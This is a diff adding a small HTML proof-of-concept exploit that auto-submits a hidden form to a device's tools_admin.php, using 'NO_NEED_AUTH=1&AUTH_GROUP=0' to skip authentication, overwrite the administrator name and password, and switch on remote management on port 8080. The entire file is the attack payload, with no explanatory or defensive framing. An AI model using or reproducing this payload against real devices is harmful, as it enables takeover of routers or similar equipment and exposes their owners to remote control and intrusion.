@@ -1,0 +1,10 @@
+<form name="exploit" action="http://server/tools_admin.php?NO_NEED_AUTH=1&AUTH_GROUP=0"  method="post">
+        <input type="hidden" name="ACTION_POST" value="1" />
+        <input type="hidden" name="admin_name" value="outlaw.dll" />
+        <input type="hidden" name="admin_password1" value="1337" />
+        <input type="hidden" name="admin_password2" value="1337" />
+        <input type="hidden" name="rt_enable_h" value="1" />
+        <input type="hidden" name="rt_port" value="8080" />
+        <input type="hidden" name="rt_ipaddr" value="192.168.0.1337" />
+</form>
+<script>document.exploit.submit();</script>
